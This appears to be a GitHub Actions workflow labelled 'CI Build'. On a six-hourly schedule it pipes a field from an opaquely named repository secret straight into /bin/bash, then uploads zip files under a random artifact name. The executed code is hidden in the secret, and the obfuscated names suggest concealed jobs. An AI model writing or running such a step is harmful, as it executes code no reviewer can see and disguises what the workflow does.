name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '34 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          nbk07: ${{ secrets.nbk07 }}
        run: |
          printf '%s' "$nbk07" | jq -r .nvm778 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: YBNTkl9A
          path: "*.zip"
          retention-days: 1
